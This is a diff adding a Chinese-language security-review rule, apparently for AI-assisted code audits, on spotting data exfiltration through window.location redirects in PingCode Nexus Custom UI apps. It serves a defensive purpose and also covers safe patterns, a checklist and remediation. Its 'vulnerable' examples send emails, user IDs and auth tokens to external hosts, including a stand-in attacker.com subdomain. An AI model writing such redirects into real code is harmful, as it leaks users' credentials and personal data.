@@ -1,0 +1,172 @@
+---
+description: 检测 Nexus Custom UI 中通过 window.location 重定向外泄数据
+globs:
+alwaysApply: false
+---
+
+背景
+
+- Nexus Custom UI 运行在沙箱化 iframe 中，但仍可通过 `window.location` 携带敏感数据跳转外部站点；Nexus manifest 的 CSP 配置未提供 `navigate-to` 限制，无法在平台层阻止此类跳转。
+- Custom UI 还可通过 `router.navigate/open`、`router.navigate` 只能跳转 PingCode 内部目标（NavigationTarget 枚举），但原生 `window.location` 可跳任意外部 URL。
+- 相关 CWE：CWE-201（将敏感信息插入发送数据）、CWE-918（若跳转目标由用户控制则叠加风险）。
+
+范围与信号
+
+- 位置：Custom UI 静态资源目录（`web/main/` 等）。
+- 重定向模式：
+  - `window.location = url`
+  - `window.location.href = url`
+  - `window.location.assign(url)`
+  - `window.location.replace(url)`
+  - `document.location`、`self.location`、`location` 变体
+  - `window.open(url)` 中携带敏感参数
+- 数据外泄向量：
+  - 查询参数：`?userData=${sensitiveData}`
+  - 子域名：`${userData}.attacker.com`
+  - 路径段：`/exfil/${userData}`
+  - URL fragment（`#token=...`）
+
+脆弱模式
+
+```typescript
+// 脆弱 - 在查询参数中携带用户数据
+const me = await bridge.api.invoke('/v1/myself');
+window.location = `https://external-site.com/callback?email=${me.email}`;
+
+// 脆弱 - 拼接敏感上下文构造 URL
+const issue = await getWorkitemDetails();
+window.location.href =
+  `https://analytics.example.com/track?id=${issue.identifier}&reporter=${issue.reporter_id}`;
+
+// 脆弱 - 跳转到未在 manifest 声明的域名
+window.location = 'https://not-in-manifest.com/page';
+
+// 脆弱 - 动态构造 URL
+const baseUrl = payload.redirectUrl; // 攻击者可控
+const token = await getAuthToken();
+window.location.assign(`${baseUrl}?token=${token}`);
+
+// 脆弱 - 数据通过子域外泄
+const userId = context.user!.id;
+window.location = `https://${userId}.tracking.attacker.com/`;
+```
+
+安全模式
+
+```typescript
+// 安全 - 静态跳转到已声明域名，无敏感参数
+window.location = 'https://docs.example.com/help';
+
+// 安全 - 对跳转目标做 allowlist 校验
+const ALLOWED_REDIRECTS = [
+  'https://app.example.com/callback',
+  'https://auth.example.com/complete',
+];
+
+function safeRedirect(url: string) {
+  if (!ALLOWED_REDIRECTS.includes(url)) {
+    throw new Error('Invalid redirect URL');
+  }
+  window.location.href = url;
+}
+
+// 安全 - 使用 Nexus router 在 PingCode 内部导航（不会跳出宿主页）
+import { router, NavigationTarget } from '@pc-nexus/bridge';
+
+async function navigateToWorkitem(identifier: string) {
+  await router.navigate(NavigationTarget.Workitem, { identifier });
+}
+
+// 安全 - 敏感数据不要通过 URL（重定向/查询串）发送。
+// Custom UI 运行在沙箱 iframe 中，没有后端 fetch.request；应通过 @pc-nexus/bridge
+// 调用本应用的 Resolver，由后端用 fetch.request 在 POST body 中发送，目标域名须已在
+// manifest permissions.external.fetch.backend 声明。
+import { invoke } from '@pc-nexus/bridge';
+
+await invoke('submitSensitiveData', { sensitive: data });
+
+// 后端 Resolver（src/）：
+// await fetch.request('https://external.example.com/submit', {
+//   method: 'POST',
+//   headers: { 'Content-Type': 'application/json' },
+//   body: JSON.stringify({ sensitive: data }),
+// });
+```
+
+检测清单
+
+- [ ] 在 Custom UI 源码目录搜索 `window.location`、`location.href`、`location.assign/replace`、`window.open`、`document.location`。
+- [ ] 提取赋值中的 URL 值，检查是否使用模板字符串或字符串拼接。
+- [ ] 检查 URL 中是否包含变量或敏感数据（token、email、用户 ID、工作项数据）。
+- [ ] 验证跳转域名是否在 manifest `permissions.external.fetch.client` 中声明。
+- [ ] 查找来自不可信来源（payload、Bridge 返回数据、URL 参数）的动态 URL 构造。
+
+数据流分析
+
+```typescript
+// 1. 找到重定向语句
+window.location.href = fullUrl;
+
+// 2. 追溯变量赋值
+const fullUrl = base + '://' + domain + '?' + params;
+
+// 3. 逐组件追溯
+const base = 'https';                     // 静态 - OK
+const domain = 'api.example.com';         // 静态 - OK
+const params = `userId=${context.user!.id}`; // 敏感数据！
+// 4. 验证域名是否在 manifest 中
+// 5. 评估参数敏感度
+```
+
+误报指标
+
+```typescript
+// 同源导航
+window.location.pathname = '/settings';
+window.location.href = './page.html';
+
+// 无参数的静态 URL
+window.location.href = 'https://help.example.com';
+
+// 局部变量遮蔽
+function handler() {
+  const location = { href: '' }; // 局部变量
+  location.href = 'value';       // 不是重定向
+}
+```
+
+Manifest 交叉引用
+
+```yaml
+permissions:
+  external:
+    fetch:
+      client:
+        - 'api.example.com'
+# 跳转到 api.example.com - 若无敏感数据视为可接受
+# 跳转到 other.example.com - 违规（未声明）
+```
+
+PoC / 测试线索
+
+- 拦截重定向并分析 URL 参数中的敏感数据。
+- 验证跳转域名是否与 manifest 声明一致。
+- 以不同用户上下文测试，验证哪些数据可被外泄。
+- 检查浏览器网络日志，识别到意外域名的出站请求。
+
+修复建议（咨询）
+
+- 避免在跳转 URL 中放入敏感数据。
+- 数据传输使用 POST 请求，不要使用 GET 参数。
+- 对跳转目标实施严格 allowlist。
+- 尽量使用 `@pc-nexus/bridge` 的 `router.navigate` 在 PingCode 内导航。
+- 所有跳转 URL 与 manifest 中声明的域名校验。
+- 考虑服务端跳转替代客户端跳转。
+
+报告指南
+
+- 记录每个重定向模式的文件位置。
+- 识别 URL 中出现的敏感数据。
+- 注明跳转域名是否已在 manifest 中声明。
+- 评估数据敏感度（PII、令牌、工作项/页面内容）。
+- 映射到 CWE-201。
